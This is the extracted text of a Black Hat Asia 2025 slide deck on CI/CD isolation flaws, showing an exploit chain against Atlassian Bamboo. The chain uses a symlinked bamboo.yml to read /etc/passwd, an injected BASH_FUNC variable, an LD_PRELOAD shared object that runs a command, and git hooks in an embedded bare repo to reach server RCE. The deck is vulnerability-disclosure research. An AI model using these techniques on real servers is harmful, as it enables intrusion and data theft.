---
title: "The Illusion of Isolation How Isolation Failures in CICD Servers Lead to RCE and Privacy Risks"
speakers: ["Tian Zhou", "Yiwen Wang", "Xiu Zhang"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2025"
edition: "ASIA"
year: 2025
source_pdf: "Black Hat Asia 2025 Slides/Tian Zhou & Yiwen Wang & Xiu Zhang_The Illusion of Isolation How Isolation Failures in CICD Servers Lead to RCE and Privacy Risks.pdf"
pages: 106
sha256: "63159cd75358a4ba91caa0ba61edb8276604a7a68a4d83a5bf439d9d4bf7a95e"
text_chars: 39075
ocr_pages: 11
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.4
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T03:58:16Z"
---
# The Illusion of Isolation How Isolation Failures in CICD Servers Lead to RCE and Privacy Risks

**Speakers:** Tian Zhou, Yiwen Wang, Xiu Zhang  
**Conference:** Black Hat ASIA 2025  
**Source:** `Black Hat Asia 2025 Slides/Tian Zhou & Yiwen Wang & Xiu Zhang_The Illusion of Isolation How Isolation Failures in CICD Servers Lead to RCE and Privacy Risks.pdf` (106 pages)


## Slide 1

# The Illusion of Isolation: How Isolation Failures in CI/CD Servers Lead to RCE and Privacy Risks

Speakers: Tian Zhou, YiWen Wang

#BHAS @BlackHatEvents

## Slide 2

# About Us

**Tian Zhou (@byc_404)**

   - **YiWen Wang (@rebirth)**

- CTFer @ NeSE

- • Web Security Researcher

- CTFer @ NeSE

- • Web Security Researcher

#BHAS @BlackHatEvents

## Slide 3

# Outline

#### 1. Introduction

#### 2. Exploit the Isolation in CI/CD

#### 3. Real World Cases

4. Takeways

#BHAS @BlackHatEvents

## Slide 4

# Outline

#### 1. Introduction

#BHAS @BlackHatEvents

## Slide 5

### Basic Workflow of CI/CD

A typical CI/CD workflow looks like

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Basic Workflow of CI/CD
CI/CD PipeLine
Code Repo C
Commit
And Push aws
Continus Integration Continus Deployment
A typical Cl/CD workflow looks like
```

## Slide 6

### Key Components of CI

#### CI/CD Platform

Server

Workers

#BHAS @BlackHatEvents

## Slide 7

### Key Components of CI Server

- Integrating with SCM

- Audit log of changes

- Design your own pipelines

- Send command to Workers

- Maintains build records

•

#BHAS @BlackHatEvents

## Slide 8

### Key Components of CI Workers

- Workers/Agents/Runners…… They are all the same!

- Runs on any OS

- Could be a machine, a container/pod

- Run jobs in a pipeline

#BHAS @BlackHatEvents

## Slide 9

### Isolation Mechanisms

By default, Server configure jobs and let workers finish them

Workers and server are isolated by physical machine boundaries or container mechanisms

#BHAS @BlackHatEvents

## Slide 10

### Isolation Mechanisms File Isolation

\```
machine-a
\```

\```
machine-b
\```

Command executes on different machines

Code should be separated in filesystem-level

Code may built in isolated Containers

#BHAS @BlackHatEvents

## Slide 11

### Isolation Mechanisms Data Isolation

Sever and worker are isolated by physical boundaries

Projects implement access control through RBAC policies

Projects are built in isolated virtualized environment

#BHAS @BlackHatEvents

## Slide 12

### Isolation Mechanisms

It looks like all CI/CD functionalities follow the isolation mechanisms…… **But is that really the case?**

Let’s see if flaws of isolation mechanisms lead to Security Problems

#BHAS @BlackHatEvents

## Slide 13

# Outline

#### 2. Exploit the Isolation in CI/CD

#BHAS @BlackHatEvents

## Slide 14

### Attack the CI/CD Attack Ways

#BHAS @BlackHatEvents

## Slide 15

### Attack the CI/CD Attack Ways

Supply Chain Attack

Leaked
Secret

Weak Password
PPE

#BHAS @BlackHatEvents

## Slide 16

### Attack the CI/CD Poisoned Pipeline Execution (PPE)

- Attackers may inject malicious code into Code Repo

- Injecting malicious code/commands into the build pipeline configuration, essentially ‘poisoning’ the pipeline

- Get access to Worker Machine

#BHAS @BlackHatEvents

## Slide 17

### Attack the CI/CD Dependency Chain Abuse

- Known as Supply Chain Attack

- Attacker may upload a malicious package to public package repositories and executes code during the process

- Dependency Confusion/ Dependency Hijacking

#BHAS @BlackHatEvents

## Slide 18

### Attack the CI/CD Pentest

Recon Gather information Find Credentials

Initial Access

PPE Supply Chain

Lateral Movement

Worker to Server Node to Master

Persistence

Backdoor C2

……

#BHAS @BlackHatEvents

## Slide 19

### Attack the CI/CD Pentest

Recon
Gather information
Find Credentials

Initial  Lateral
Access Movement
PPE Worker to Server
Supply Chain Node to Master
……

Persistence
Backdoor
C2

Access of Worker instead of Server !

#BHAS @BlackHatEvents

## Slide 20

### Attack the CI/CD Shell

Also, CI/CD pipelines typically provide you with the opportunity to execute commands in Worker directly

#BHAS @BlackHatEvents

## Slide 21

### Attack the CI/CD

#### Server

- In most cases, Attackers get a worker shell as initial access

- Have access to limited resource (code, repo, secrets)

- Still need to do lateral movements, container escape, etc.

**Motivation**

Can we find more vulns of the server side, with the help of isolation mechanisms? **Goal** Execute commands on the server side, not the worker side

#BHAS @BlackHatEvents

## Slide 22

### SCM Introduction

**Source code management (SCM)** and CI/CD form the foundation of modern software development practices

#BHAS @BlackHatEvents

## Slide 23

### SCM SCM in CI/CD

- CI/CD takes the code managed by SCM systems and automatically builds, tests, and validates it whenever changes are pushed

- So, your code is **processed** by CI/CD, and may cause problems not only in worker side

- What makes SCM a great attack target?

#BHAS @BlackHatEvents

## Slide 24

### SCM Attack Surface **Ⅰ**

- Repo is configured by user

- • Parameters such as the repository URL or branch are attacker-controllable

#BHAS @BlackHatEvents

## Slide 25

### SCM Attack Surface **Ⅱ**

- SCM needs to interact with the repo, so it might use the client and executes corresponding commands

- Chances of Command Injection, Parameters Injection

#BHAS @BlackHatEvents

## Slide 26

### SCM Attack Surface **Ⅲ**

- An attacker can fully control the content within a code repository

- • If malicious files are stored on the target machine, it may be possible to chain with other vulnerabilities for further exploitation

#BHAS @BlackHatEvents

## Slide 27

### Attack the SCM

OK, now you should know that SCM is dangerous Can we use it to find more vulns in CI/CD ? Let’s start with some interesting cases

##### Talk is cheap, show me the vuln CVE

#BHAS @BlackHatEvents

## Slide 28

# Outline

#### 3. Real World Cases

#BHAS @BlackHatEvents

## Slide 29

### Real World Cases Atlassian Bamboo

Atlassian Bamboo is a continuous integration (CI) server that can be used to automate the release management for a software application, creating a continuous delivery pipeline

#BHAS @BlackHatEvents

## Slide 30

### Real World Cases Atlassian Bamboo

In Bamboo, **plan** defines everything about the continuous integration build process

Create a **repository** and link it to the **plan**

#BHAS @BlackHatEvents

## Slide 31

### Bamboo Specs

##### Bamboo Specs

- _Configuration as code is available in Bamboo. They called this feature_ **_Bamboo Specs_**

- _Storing your build plan configuration as code for easier automation, change tracking, validation, and much more_

#BHAS @BlackHatEvents

## Slide 32

### Bamboo Specs

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bamboo Specs
Bamboo Specs
- Maven &
Oe if YmYaml
fetch code
from remote Scan the repo . >
repo checks YML
bamboo-specs Scan the yml document Create the Bamboo Plan
dir
```

## Slide 33

### Bamboo Specs Bamboo YAML Specs

\```
---
version:2
plan:
project-key:MARS
key:ROCKET
name:Buildthe rocket
stages:
-Buildhull:
-Build
\```

\```
Build:
tasks:
-script:
-echo 'Hello World!'
\```

#BHAS @BlackHatEvents

## Slide 34

### Bamboo Specs Bamboo Java Specs

\```
mvn archetype:generate -B \-
DarchetypeGroupId=com.atlassian.bambo
o -DarchetypeArtifactId=bamboo-specs-
archetype \-DarchetypeVersion=6.2.1
\-DgroupId=com.atlassian.bamboo -
DartifactId=bamboo-specs -
Dversion=1.0.0-SNAPSHOT \-
Dpackage=tutorial -Dtemplate=minimal
\```

\```
privatePlancreatePlan() {
returnnew Plan(
project(),
"Plan Name", "PLANKEY")
.description("Plan created from (enter
repository urlof your plan)")
.stages(
new Stage("Stage 1")
.jobs(new Job("Run", "RUN")
.tasks(
new ScriptTask().inlineBody("echo
Hello world!"))));
}
\```

#BHAS @BlackHatEvents

## Slide 35

### Bamboo Specs Specs Scan

\```
git clone
https://github.com/user/repo.git
> Cloning into `…` …
\```

- `Remote: counting objects:10, done`

- `Remote: compressing objects : 100% (8/8), done`

\```
> Remote: Total 10 (delta 1), reused 10
(delta 1)
\```

- `Unpacking objects: 100%(10/10), done`

So how does Bamboo scan for a file in a git repository?

Answer: Clone it to local

#BHAS @BlackHatEvents

## Slide 36

### Bamboo Specs

###### `repository-<REPO_ID>-<BRANCH_NAME>`

\```
return new QuietlyRemoved() {
public void close() {
BambooPathUtils.deleteQuietly(path);
}
};
\```

- `./repository-2424852-master/checkout/`

- `./repository-2424852-master/checkout/bamboo-specs ./repository-2424852-master/checkout/bamboospecs/specs1770183892960720857.xml`

- `./repository-2424852-master/checkout/bamboo-specs/pom.xml`

- `./repository-2424852-master/checkout/bamboo-specs/src`

- `./repository-2424852-master/checkout/bamboo-specs/src/test`

###### **Check out  Repo        Got deleted**

\```
./repository-2424852-master/checkout/bamboo-specs/src/test/java
\```

#BHAS @BlackHatEvents

## Slide 37

### Bamboo Specs

- It is possible to put a repo on the server side of Bamboo

- • Lack of file isolation

- Let’s see what we can do

#BHAS @BlackHatEvents

## Slide 38

### Bamboo Specs Arbitrary File Read

\```
StringbambooYaml= FileUtils.readFileToString(yamlFile.toFile(), StandardCharsets.UTF_8);
List<Map<String, Object>> bambooYamlDocs=
this.bambooYamlSpecsService.splitDocuments(bambooYaml, yamlFile.getParent());
YamlBuilderReferencesyamlBuilderReferences= this.parseYaml(bambooYamlDocs, repository,
stdout);
\```

\```
publicstaticStringreadFileToString(Filefile, Charset
charsetName) throws IOException {
returnIOUtils.toString(() ->{
returnFiles.newInputStream(file.toPath());
}, Charsets.toCharset(charsetName));
}
\```

- Read bamboo.yml from repo

- Parse it with Snakeyaml

- Convert to Bamboo Plan

#BHAS @BlackHatEvents

## Slide 39

### Bamboo Specs Arbitrary File Read

 `ln -s /etc/passwd bamboo.yml`

`root@my-machine:/tmp/pocwork/bamboo-specs# ls -la total 8`  `drwxr-xr-x 2 root root 4096 Mar 13 16:41 . drwxr-xr-x 4 root root 4096 Mar 13 16:41 .. lrwxrwxrwx 1 root root 11 Mar 13 16:41 bamboo.yml -> /etc/passwd`

Create a symbolic link named bamboo.yml and point it to /etc/passwd

#BHAS @BlackHatEvents

## Slide 40

### Bamboo Specs Arbitrary File Read

Git determines whether to create symbolic links based on the core.symlinks option

This symbolic link appears as plain text containing the link file when viewed from the remote Git server frontend.

#BHAS @BlackHatEvents

## Slide 41

### Bamboo Specs Arbitrary File Read

\```
catch(Throwablevar16) {
log.info("Bamboo YAML import failed", var16);
RssExecutionLogUtils.appendMessageToLog(stdout,
String.format("There was an error when processing yaml
file \"%s\". File structure is correct, contact
Atlassian Support for assistance on resolving this
issue.\n\n", yamlFile.getFileName()));
\```

\```
specsConsumer.onError(repository, commits,
specsSource, rssPermissions, stdout, var16,
logFilename);
\```

\```
Throwables.throwIfUnchecked(var16);
thrownewRuntimeException(var16);
\```

- When parsing YAML, exceptions are caught by an outermost catch statement in the code

- An exception is thrown during parsing, which contains the contents of a sensitive file

- The specs scan will log the exception

\```
}
\```

#BHAS @BlackHatEvents

## Slide 42

#### Sensitive file content exposed

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 49/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
15-apr-2024 10:41:47 Bamboo YAML import failed: Invalid format of the YAML file: Element [root:%: 0:0: root: root: bin/bash ¢
Sensitive file content exposed
```

## Slide 43

### Bamboo Specs Environment Variable Injection

- Bamboo supports a code source named **Perforce**

- When creating repository, it may take environment variables as input

#BHAS @BlackHatEvents

## Slide 44

### Bamboo Specs Environment Variable Injection

\```
Map<String, String> variables=
\```

\```
this.environmentVariableAccessor.splitEnvironmentAssignments(this.getEnvironmentVariables(), false);
Depotdepot= this.perforceDepot!= null?this.perforceDepot:newDepot(variables);
Depot.Settingssettings= newDepot.Settings();
\```

- Perforce use environment variables to specify configuration

- But bamboo lacks validation for environment variables that users can input

- • Environment Variable Injection when test connection

#BHAS @BlackHatEvents

## Slide 45

### Bamboo Specs Environment Variable Injection

\```
//
com.tek42.perforce.parse.AbstractPerforceTemplate#getPerforceResponse(java.l
ang.String[], boolean)
\```

\```
while((line = reader.readLine()) != null) {
\```

\```
++count;
\```

\```
for(inti= 0; i< RESPONSE_MESSAGES.length; ++i) {
if(line.contains(RESPONSE_MESSAGES[i])) {
mesgIndex= i;
\```

\```
//
com.tek42.perforce.parse.AbstractPerforceTemplate#lo
gin
// ……
login = this.depot.getExecFactory().newExecutor();
String[] args= newString[]{"/bin/sh", "-c",
this.depot.getExecutable() + " login -p"};
\```

\```
}
\```

\```
}
\```

\```
}
\```

\```
// ......
\```

\```
if(!attemptLogin|| mesgIndex!= 1&& mesgIndex!= 2&& mesgIndex!= 3) {
// ......
\```

\```
} else{
p4.close();
this.login();
loop = true;
attemptLogin= false;
\```

- Perforce will attempt login when current response message indicates that requires login

- Invoke a linux command by /bin/ sh

\```
}
\```

#BHAS @BlackHatEvents

## Slide 46

### Bamboo Specs Environment Variable Injection

\```
env $'BASH_FUNC_echo()=() { id; }'bash -c "echo hello"
\```

- Invoked by /bin/ sh instead of /bin/bash

The famous environment variables injection techniques introduced by phithon

- Only works at CentOS

- Can we make it more universal?

https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environmentinjection.html

#BHAS @BlackHatEvents

## Slide 47

### Bamboo Specs Environment Variable Injection

###### `LD_PRELOAD=/var/www/html/uploads/evil.so` `"` `echo hello` `"`

- We can still use the old but decent LD_PRELOAD technique to make it work!

- Only if we had a way to upload an evil so to the target server

- Remember our bamboo specs repo?

#BHAS @BlackHatEvents

## Slide 48

### Bamboo Specs Environment Variable Injection

① Prepare a repo with evil so

② Use bamboo specs to checkout the repo on the server ③ Create a perforce repo and specify LD_PRELOAD ④ Test Connection

\```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
__attribute__((__constructor__)) void
preload(void)
{
unsetenv("LD_PRELOAD");
system("/usr/bin/touch /tmp/pwned");
}
\```

#BHAS @BlackHatEvents

## Slide 49

Looks good, but …… How do you determine the absolute path of a checked-out repo? How can an evil so persist on the target server without being deleted?

#BHAS @BlackHatEvents

## Slide 50

### Bamboo Specs Leak the checkout path

\```
StringbambooYaml= FileUtils.readFileToString(yamlFile.toFile(), StandardCharsets.UTF_8);
List<Map<String, Object>> bambooYamlDocs=
\```

\```
this.bambooYamlSpecsService.splitDocuments(bambooYaml, yamlFile.getParent());
YamlBuilderReferencesyamlBuilderReferences= this.parseYaml(bambooYamlDocs, repository,
stdout);
\```

\```
intincludeMaxDepth= (int)SystemProperty.SPECS_YAML_INCLUDE_MAX_DEPTH.getTypedValue();
Yamlyamlizator= yamlDirectory == null?Yamlizator.getYaml() :
Yamlizator.getYamlWithRepositoryIncludes(includeMaxDepth, yamlDirectory);
ValidationContextvalidationContext= ValidationContext.empty();
List<Map<String, Object>> yamlStructures= newArrayList();
\```

#BHAS @BlackHatEvents

## Slide 51

### Bamboo Specs Leak the checkout path

\```
BambooYamlWithIncludesConstructor(int
maxDepth, intdepth, PathparentPath,
LoaderOptionsloadingConfig) {
super(loadingConfig);
this.yamlConstructors.put(new
Tag("!include"), new
IncludeTag(maxDepth, depth,
parentPath));
}
\```

- Snakeyaml supports a !include tag feature

- When using !include in YML, a path traversal check will be triggered

#BHAS @BlackHatEvents

## Slide 52

### Bamboo Specs Leak the checkout path

`!include ../test.yml` bamboo-specs/bamboo.yml

\```
Anything: anywhere
\```

test.yml

Trigger exception

Path Revealed

\```
/var/bamboo/bamboo-home/local-working-
dir/serverSide/REPOSITORY_STORED_SPECS/repository-2424842-
getpath/checkout/bamboo-specs
\```

Bamboo data directory

Checkout directory

repositoryId

#BHAS @BlackHatEvents

## Slide 53

### Bamboo Specs Persist the File

- The repo will be deleted after the specs scan is completed, so how can we persist the file?

- Race condition? Possible, but not elegant enough

- Any other ways to persist the file on the target server?

Thread-1

Test Connection

Thread-2
Specs Scan

#BHAS @BlackHatEvents

## Slide 54

### Bamboo Specs Persist the File

\```
publicstaticvoidmain(finalString[] args)
throws Exception {
try{
Thread.currentThread().sleep(60* 1000);
} catch(InterruptedExceptione) {
e.printStackTrace();
}
\```

\```
}
\```

Bamboo java specs runs java code in an isolated Docker container

Just sleep for a while and hold the process, the files won’t be deleted!

#BHAS @BlackHatEvents

## Slide 55

### Bamboo Specs Environment Variable Injection

① Prepare a repo with evil so

② Use bamboo specs to get the path from server

- ③ Use bamboo specs to checkout the repo on the server

④ Create a perforce repo and specify LD_PRELOAD with the path of evil.so

⑤ Test Connection

RCE!

#BHAS @BlackHatEvents

## Slide 56

### Bamboo Specs

- RCE by LD_PRELOAD is great, but the Perforce executable may not be installed, so the Perforce functionality is not necessarily available

- • No Environment Variables Injection by default

Finding other ways to RCE……

#BHAS @BlackHatEvents

## Slide 57

### Server Push Attack

##### In Bamboo, there’s a section called **Branches** for CI plan

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Default plan configuration
Plan details Stages Repositories Triggers Branches Dependencies Permissions Notifications Variables Auditlog Other
» Stages & jobs 1
Stage 1 Branches
3 Job Name Plan branches allow you to run builds across different branches in your source repository using the same plan configuration.
Create plan branch
© Manually
When new branch in repository is created
When new branch in repository is created and matches expression
Delete plan branch
After branch was deleted from repository
After branch inactivity in repository
Merging
\utomatic merging can test the merge betw ches and f ranges t he ret y uccessf i. Thi . applied w plan bral
Branch merging enabled ®
© Branch updater © Gatekeeper ©
Checkout $9 current branch
Merge from ce plan
Build Merge result
Push on @ $8 cur
In Bamboo, there’s a section called Branches for Cl plan
```

## Slide 58

### Server Push Attack

_Plan branches allow you to run builds across different branches in your source repository using the same plan configuration_

Users are allowed to create branches and run specific branch during build task, here, different branches represent different branches of the repository to which the current plan owns

#BHAS @BlackHatEvents

## Slide 59

### Server Push Attack

Bamboo will:

- merge from given branch

- push on featured branch

The whole process happens during Run branch , and that’s how you run a CI Job as well

#BHAS @BlackHatEvents

## Slide 60

### Server Push Attack

\```
if(lastCurrentStage == null&&
branchIntegrationConfiguration.isEnabled()) {
log.info("Doing the merge before the first stage");
this.doVcsMerge(chainState);
// ......
\```

\```
}
// ......
if(!chainState.isGoingToStopAtManualStage() &&
chainState.isSuccessful() &&
branchIntegrationConfiguration.isEnabled() &&
branchIntegrationConfiguration.isPushEnabled()) {
this.pushTheMergedCommit(chainState,
branchIntegrationConfiguration.getStrategy());
}
//.....
\```

The build tasks are split into different stages in the code and exist in a chained form

Here’s the code related to the plan branch

1. Check if `branchintegration` is enabled 2. Do `VcsMerge` if enabled

`3. pushTheMergedCommit` when finished

#BHAS @BlackHatEvents

## Slide 61

### Server Push Attack

\```
// ChainExecutionManagerImpl#doVcsMergeRunnable
PlanRepositoryDefinitiondefaultRepositoryDef=
BuildContextHelper.getDefaultPlanRepositoryDefinition(buildContext);
if(defaultRepositoryDef == null) {
\```

\```
} else{
\```

\```
//......
\```

\```
FilemergeDir= new
\```

\```
File(this.buildDirectoryManager.getServerSideTaskWorkingDirectory(planResultKey), "mergeWorkspace");
this.branchIntegrationHelper.mergeAndUpdateResult(buildContext, defaultRepositoryDef,
moduleDescriptor, mergeResult, mergeDir, (BuildLogger)null, (vcsMergeState) ->{
chainState.setMergeWorkingCopy(vcsMergeState.getMergeWorkingCopy());
}, () ->{
\```

\```
if(MergeResultState.SUCCESS!= mergeResult.getMergeState()) {
BambooPathUtils.deleteQuietly(mergeDir.toPath());
}
});
\```

Git merge

\```
}
\```

#BHAS @BlackHatEvents

## Slide 62

### Server Push Attack

\```
// ChainExecutionManagerImpl#pushTheMergedCommitRunnable
\```

\```
if(MergeResultState.SUCCESS== mergeResult.getMergeState() && !mergeResult.isEmptyMerge()) {
// .....
\```

   - `if (moduleDescriptor != null && moduleDescriptor.supportsRemoteUpdates()) { String commitRevision = (String)this.planExecutionLockService.lock(new`

- `TriggerableInternalKeyImpl(planResultKey.getPlanKey()), AcquisitionPolicy.IMMEDIATE, () -> { // ......`

\```
UpdatingVcsWorkingCopyManagerremoteUpdater=
\```

\```
(UpdatingVcsWorkingCopyManager)Narrow.downTo(moduleDescriptor.getWorkingCopyManager(),
UpdatingVcsWorkingCopyManager.class);
\```

\```
VcsWorkingCopyworkingCopyAfterCommit=
\```

\```
remoteUpdater.commitLocal(chainState.getMergeWorkingCopy(), repositoryToPushTo, commitMessage);
VcsWorkingCopyworkingCopyAfterPush= remoteUpdater.updateRemote(workingCopyAfterCommit,
repositoryToPushTo, commitMessage);
\```

\```
});
\```

\```
}
\```

\```
}
\```

Git commit Git push

#BHAS @BlackHatEvents

## Slide 63

### Server Push Attack

- Merge, Commit, Push, all seems like regular operations of git commands

- What potential threats does it pose?

- Introducing Server Push Attack

commit
merge push

#BHAS @BlackHatEvents

## Slide 64

### Server Push Attack

When talking about remote repo, We assume it is hosted on remote server

What if the remote repo is …… A Local Repo ?

Remote repo

Local Repo

#BHAS @BlackHatEvents

## Slide 65

### Server Push Attack Git Workflow

###### http://mygit/me/myrepo.git

- Normally, you perform git clone to get a working copy

- • Then perform git add , git commit to get a local repo

- Finally, we push the local repository to the remote repository using git push

#BHAS @BlackHatEvents

## Slide 66

### Server Push Attack Git Workflow

http://mygit/me/myrepo.git

file:///tmp/myrepo

- But you can also clone a working copy from local repository

- Almost all other operations are the same, except that we use the file protocol instead of http protocol

- Does it expose potential risks?

#BHAS @BlackHatEvents

## Slide 67

### Server Push Attack Git hooks

- Git hooks are scripts that are triggered by certain actions in the software development process

- By automatically pointing out issues in code, they allow reviewers not to waste time on mistakes that can be easily diagnosed by a machine

#BHAS @BlackHatEvents

## Slide 68

### Server Push Attack

#### Git hooks

##### Client-side hooks

##### Server-side hooks

**Pre-receive hook**

**Pre-Commit hook**

_Used to inspect the snapshot that’s about to be committed_

_Performs checks on the content of the push_

###### **Post-receive hook**

###### **Commit-Message hook**

_Used to edit or refuse the commit message_

_Runs after the entire process of pushing code to the server is completed_

#BHAS @BlackHatEvents

## Slide 69

### Server Push Attack

#### Git hooks

check your own git repo and you will find hook files waiting to be edited

executes arbitrary command when git command invokes

#BHAS @BlackHatEvents

## Slide 70

### Server Push Attack Git Workflow

http://mygit/me/myrepo.git

file:///tmp/myrepo

**Pre-receive hook**

**Pre-receive hook**

Executes on the <u>server</u> side

Executes on the server side

Executes on the client side!

#BHAS @BlackHatEvents

## Slide 71

### Server Push Attack Server Hooks

- When calling git push, git- receive-pack will be invoked by the Git process on the server side

- SSH/HTTP(s) protocol by default

- So git- receive - pack will be called when push from a local repo, then the hook script will be invoked on the same machine

#BHAS @BlackHatEvents

## Slide 72

### Server Push Attack Server Hooks

- If we specify a repo through file protocol, we can trigger server hooks on the “client” side

- Seems feasible, but……

   1. We do not have a local repo on target server

   2. Git hooks are not controllable in a working copy

- Still need a vuln to write things into hooks directory under local repo

Really?

#BHAS @BlackHatEvents

## Slide 73

### Server Push Attack Git Magic

https://github.com/caskdata/usefulpackage

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Git Magic
usefulpackage Public
@ offensi Create README.md
evilgitdirectory Added evilgitdirectory
( README.md Create README.md
usefulpackage
please go ahead and run the following commands:
git clone https://github.com/offensi/usefulpackage
¢ cd usefulpackage/evilgitdirectory
© git checkout master
This looks innocent right? >:)
@ Watch 1
o ©)12 Commits
```

## Slide 74

### Server Push Attack Git Magic



\```
joe@my-machine:/tmp# git clone
https://github.com/caskdata/usefulpackage
Cloninginto 'usefulpackage'...
remote:Enumeratingobjects:113, done.
remote:Total 113(delta 0), reused 0(delta 0),
pack-reused 113(from 1)
Receivingobjects:100% (113/113), 18.75KiB |
197.00KiB/s, done.
Resolvingdeltas:100% (16/16), done.
\```



\```
joe@my-machine:/tmp/usefulpackage/# cd
evilgitdirectory/
\```



\```
joe@my-machine:/
tmp/usefulpackage/evilgitdirectory# git checkout
master
D.gitignore
DREADME.md
Dasdf/asdf
Alreadyon 'master'
Yourbranch is up to date with 'origin/master'.
\```

\```
==================================
arbitrary evil code goes here ;)
==================================
\```

Code execution

#BHAS @BlackHatEvents

## Slide 75

### Server Push Attack Git Magic

\```
joe@my-machine:/
tmp/usefulpackage/evilgitdirectory# cat
hooks/post-checkout
#!/bin/sh
\```

\```
echo '=================================='
echo ' arbitrary evil code goes here ;) '
echo '=================================='
\```

- The post-checkout hook got executed, but why?

- Let’s take a look  at the `evilgitdirectory` directory

- • There goes the bare repo

###### `total 52`

\```
drwxr-xr-x 7joe joe4096Mar 1515:00.
drwxr-xr-x 4joe joe4096Mar 1514:59..
-rw-r--r--1joe joe5Mar 1514:59COMMIT_EDITMSG
-rw-r--r--
1joe joe286Mar 1514:59config
-rw-r--r--
1joe joe73Mar 1514:59description
-rw-r--r--1joe joe23Mar 1515:00HEAD
drwxr-xr-x 2joe joe4096Mar 1514:59hooks
-rw-r--r--1joe joe318Mar 1515:00index
drwxr-xr-x 2joe joe4096Mar 1514:59info
drwxr-xr-x 3joe joe4096Mar 1514:59logs
drwxr-xr-x 14joe joe4096Mar 1514:59objects
-rw-r--r--
1joe joe107Mar 1514:59packed-refs
drwxr-xr-x 4joe joe4096Mar 1514:59refs
\```

#BHAS @BlackHatEvents

## Slide 76

### Server Push Attack

#### Bare repo

- A bare git repository is intended to be used as a remote repository where code is shared between members of the team

- • The bare Git repo is not intended for local development

- You may see them on Git servers

#BHAS @BlackHatEvents

## Slide 77

### Server Push Attack Bare repo

- It is possible to put a bare repo in a regular git repository and host it on remote

- All the files will remain the same structure when cloning to local, including the hooks scripts

- The hook scripts are ready to be executed through Git commands

#BHAS @BlackHatEvents

## Slide 78

### Server Push Attack Final Exploit

Bamboo Specs Run branch
Place a repo on  Leak the repo  Push to a  Run plans on
the server path repository worker side
Hook Scripts file://TARGET_REPO_PATH
RCE

#BHAS @BlackHatEvents

## Slide 79

### Server Push Attack Final Exploit

R P
Bamboo Specs Run branch
Place a repo on  Leak the repo  Push to a
the server path repository worker side
Hook Scripts file://TARGET_REPO_PATH
RCE

Run plans on worker side **R** User with only Repo privileges **P** User with only Plan privileges

#BHAS @BlackHatEvents

## Slide 80

BONUS: A PRIV-ESC vuln to escalate from Repo user to Plan user

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
h r
BONUS: A PRIV-ESC vuln to escalate
from Repo user to Plan user
```

## Slide 81

### Server Push Attack Final Exploit

- Permission incorrectly set to system during bamboo specs process

- Use it to overwrite the configuration of current project

#BHAS @BlackHatEvents

## Slide 82

### Server Push Attack Final Exploit

① Logged in as repo user

- ② Escalate privileges to create a plan in current project

- ③ “Deploy” a repo on target server via bamboo specs

- ④ Assign the bare repo for the plan and run plan

⑤ Hooks triggered during git push

⑥ RCE

#BHAS @BlackHatEvents

## Slide 83

### Server Push Attack Final Exploit

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Final Exploit
Branch integration details
Checked out master:5585db9af-*
Merged with new:e59202e06-- ©
Pushed ©
Failure reason |Push command error: remote: uid=1002(bamboo) gid=1002(bamboo) groups=1002(bamboo),123(docker) bamboo
remote: error: refusing to update checked out branch: refs/heads/master
remote: error: By default, updating the current branch in a non-bare repository
remote: is denied, because it will make the index and work tree inconsistent v a?
remote: with what you pushed, and will require ‘git reset --hard’ to match a 4
remote: the work tree to HEAD.
remote: ¢
remote: You can set the ‘receive.denyCurrentBranch’ configuration variable
remote: to ‘ignore’ or ‘warn’ in the remote repository to allow pushing into
remote: its current branch; however, this is not recommended unless you
remote: arranged to update its work tree to match what you pushed in some
remote: other way.
remote:
remote: To squelch this message and still keep the default behaviour, set
remote: ‘receive.denyCurrentBranch’ configuration variable to ‘refuse’.
To file:///tmp/gitdemo
! [remote rejected] master -> master (branch is currently checked out)
error: failed to push some refs to ‘file:///tmp/gitdemo'
```

## Slide 84

### Real World Cases Apply to Others

- Certain SCM-related functionalities may overlook file isolation

- Repository operations being performed on the local machine

- Result in severe security risks

- Anymore?

#BHAS @BlackHatEvents

## Slide 85

### Real World Cases

#### GoCD

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Dgo DASHBOARD AGENTS MATERIALS
DEFAULT #& ACTIVE FAILED
Group pipelines by: Pipeline Groups v
go-cd
build-linux
Instance: 8178
Triggered by chadlwilson
on 16 Mar, 2025 at 19:27:19 Local Time
Security-Checks
Instance: 7819
Triggered by timer
on 19 Mar, 2025 at 06:00:01 Local Time
gocd-trial-installers-stable
You haven't run this pipeline yet. Click
the play button to run pipeline.
build-windows
Instance: 7855
Triggered by chadlwilson
on 16 Mar, 2025 at 23:13:57 Local Time
Security-Checks-Containers
Instance: 1527
pare | Changes w | YS
Triggered by timer
on 19 Mar, 2025 at 06:00:03 Local Time
oCD
plugins
Instance: 5357
mpare | Changes w | VSN
Triggered by changes
on 16 Mar, 2025 at 20:29:09 Local Time
installer-tests
Hi
Instance: 2764
mpare | Changes w | VSN
Triggered by changes
on 18 Mar, 2025 at 09:10:32 Local Time
installers
Instance: 4578
mpare | Cha
Triggered by changes
on 16 Mar, 2025 at 20:30:39 Local Time
code-sign
Instance: 2007
Triggered by changes
on 18 Mar, 2025 at 09:00:32 Local Time
